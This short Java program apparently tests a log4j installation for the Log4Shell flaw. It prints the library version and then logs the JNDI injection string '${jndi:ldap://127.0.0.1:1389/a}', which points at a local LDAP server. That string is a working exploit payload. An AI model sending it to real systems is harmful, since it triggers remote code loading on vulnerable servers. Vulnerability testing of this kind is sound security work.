import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
import org.apache.log4j.PropertyConfigurator;

public class log4j {
    private static final Logger logger = Logger.getLogger(log4j.class.getName());

    public static void main(String[] args) {
        PropertyConfigurator.configure("log4j.properties");
        logger.error(LogManager.class.getPackage().getImplementationVersion());
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
